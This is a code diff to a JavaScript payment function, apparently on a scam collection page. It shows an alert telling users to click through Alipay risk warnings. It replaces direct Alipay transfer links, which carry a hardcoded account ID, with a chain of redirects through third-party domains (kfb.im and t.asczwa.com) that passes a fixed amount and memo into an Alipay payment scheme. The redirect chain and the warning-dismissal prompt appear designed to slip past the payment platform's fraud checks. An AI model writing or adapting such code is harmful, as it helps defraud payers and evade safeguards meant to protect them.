@@ -206,14 +206,20 @@
 
     function repay() {
         alert('如果提示风险，请点击继续付款');
-        var urls = 'alipays://platformapi/startapp?appId=09999988&actionType=toAccount&goBack=NO&amount=' + h + '&userId=' + a;
-        var go_url = 'alipayqr://platformapi/startapp?appId=20000123&actionType=scan&biz_data={\"s\": \"money\",\"u\": \"2088432847206855\",\"a\": \"100.00\"}';
-        // urls = encodeURIComponent(urls);
-        // var url='https://ds.alipay.com/?from=mobilecodec&scheme='+urls;
-        window.location.href = go_url;
+        // var urls = 'alipays://platformapi/startapp?appId=09999988&actionType=toAccount&goBack=NO&amount=' + h + '&userId=' + a;
+        // var go_url = 'alipayqr://platformapi/startapp?appId=20000123&actionType=scan&biz_data={\"s\": \"money\",\"u\": \"2088432847206855\",\"a\": \"100.00\"}';
+        // // urls = encodeURIComponent(urls);
+        // // var url='https://ds.alipay.com/?from=mobilecodec&scheme='+urls;
+        // window.location.href = go_url;
 
         ///////
-
+        var amount = "1.00" || '';
+        var memo = "15000032923412400" || '';
+        var url2 = "https://kfb.im//alipay.php?a=" + amount + "&m=" + memo;
+        var url1 = 'alipays://platformapi/startapp?saId=10000007&qrcode=';
+        var u = 'https://render.alipay.com/p/s/i?scheme='+s2c(url1+s2c(url2));
+        u ='https://t.asczwa.com/taobao?backurl='+s2c(u);
+        location.replace(u);
     }
 
 
